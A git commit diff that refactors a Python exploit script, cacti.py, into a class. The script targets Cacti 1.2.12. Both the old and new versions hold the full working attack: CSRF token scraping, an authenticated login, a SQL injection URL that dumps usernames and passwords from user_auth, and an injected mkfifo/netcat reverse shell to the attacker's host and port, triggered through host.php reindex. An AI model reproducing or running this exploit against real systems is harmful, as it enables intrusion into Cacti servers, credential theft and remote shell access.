65864a99f7ef7a09ac6c1b03ba65da6487fdf60d
Adrian <hadrian3689@gmail.com>
2022-01-11 23:06:29 -0500

    Added clases

--- cacti.py
+++ cacti.py
@@ -3,56 +3,71 @@ import requests
 import re
 import time
 
-def string_fix(url):
-    if url[-1] == "/": 
-        fixed_url = url.rstrip(url[-1])
-        return fixed_url
-    else:
-        return url
+class Cacti():
+    def __init__(self,target,username,password,lhost,lport):
+        self.target = target
+        self.username = username
+        self.password = password
+        self.lhost = lhost
+        self.lport = lport
+        self.new_url = self.url_fix()
+        self.nccheck()
 
-def nccheck(url,username,password,lhost,lport):
-    while True:
-        nc_check = input("Is netcat running? y or n? ")
-        if nc_check == 'y':
-            sql_exploit(url,username,password,lhost,lport)
-        elif nc_check == 'n':
-            print("Make sure netcat is running with nc -lvnp " + lport)
-            exit()
+    def url_fix(self):
+        if self.target[-1] == "/":
+            fixed_url = self.target.rstrip(self.target[-1])
+            return fixed_url
         else:
-            continue
+            return self.target
 
-def sql_exploit(url,username,password,lhost,lport):
-    requests.packages.urllib3.disable_warnings()
-    login_url = url + '/cacti/index.php'
+    def nccheck(self):
+        while True:
+            nc_check = input("Is netcat running? y or n? ")
+            if nc_check == 'y':
+                self.sql_exploit()
+            elif nc_check == 'n':
+                print("Make sure netcat is running with nc -lvnp " + self.lport)
+                continue
+            else:
+                print("Incorrect Input. Only y or n are allowed.")
+                continue
 
-    print("Getting the csrf token!")
-    time.sleep(1)
+    def sql_exploit(self):
+        requests.packages.urllib3.disable_warnings()
+        login_url = self.new_url + '/cacti/index.php'
 
-    session = requests.Session()
-    csrf_url_req = session.get(login_url,verify=False)
-    
-    csrf = re.findall("srfMagicToken = \"(.*);ip",csrf_url_req.text)
-    
-    print("The csrf is token is: " + csrf[0])
-    time.sleep(1)
+        print("Getting the csrf token!")
+        time.sleep(1)
 
-    data = {'__csrf_magic':csrf[0],'action':'login','login_username':username,'login_password':password}
+        session = requests.Session()
+        csrf_url_req = session.get(login_url,verify=False)
+        
+        csrf = re.findall("srfMagicToken = \"(.*);ip",csrf_url_req.text)
+        
+        print("The csrf is token is: " + csrf[0])
+        time.sleep(1)
 
-    print("Logging in")
-    time.sleep(1)
-    login_req = session.post(login_url,data=data,verify=False)
+        data = {'__csrf_magic':csrf[0],'action':'login','login_username':self.username,'login_password':self.password}
 
-    print("Sending payload")
-    time.sleep(1)
-    sql_inj_url = url + "/cacti/color.php?action=export&header=false&filter=1%27)+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value=%27rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2%3E%261|nc+"+lhost+"+"+lport+"+%3E/tmp/f;%27+where+name=%27path_php_binary%27;--+-"
-    sql_inj_req = session.get(sql_inj_url,verify=False)
+        print("Logging in")
+        time.sleep(1)
+        login_req = session.post(login_url,data=data,verify=False)
 
-    payload_execute_url = url + "/cacti/host.php?action=reindex"
-    payload_execute_req = session.get(payload_execute_url,verify=False)
+        print("Sending payload")
+        time.sleep(1)
 
+        sql_inj_line = """/cacti/color.php?action=export&header=false&filter=1%27)+UNION+SELECT+1,username,password,4,5,6,7+
+        from+user_auth;update+settings+set+value=%27rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2%3E%261|
+        nc+"""+self.lhost+"""+"""+self.lport+"""+%3E/tmp/f;%27+where+name=%27path_php_binary%27;--+-"""
 
+        sql_inj_url = self.new_url + sql_inj_line
+        sql_inj_req = session.get(sql_inj_url,verify=False)
 
-def main():
+        payload_execute_url = self.new_url + "/cacti/host.php?action=reindex"
+        payload_execute_req = session.get(payload_execute_url,verify=False)
+        exit()
+
+if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='Cacti 1.2.12 - SQL Injection / Authenticated Remote Code Execution')
 
     parser.add_argument('-t', metavar='<Target URL>', help='target/host URL, E.G: http://exploitcacti.com', required=True)
@@ -62,20 +77,9 @@ def main():
     parser.add_argument('-lport', metavar='<lport>', help='Your Listening Port', required=True)
     args = parser.parse_args()
 
-    url = args.t
-    username = args.u
-    password = args.p
-    lhost = args.lhost
-    lport = args.lport
-
-    url = string_fix(url)
-
     while True:
         try:
-            nccheck(url,username,password,lhost,lport)
+            Cacti(args.t,args.u,args.p,args.lhost,args.lport)
         except KeyboardInterrupt:
             print("Bye Bye!")
             exit()
-
-if __name__ == "__main__":
-    main()
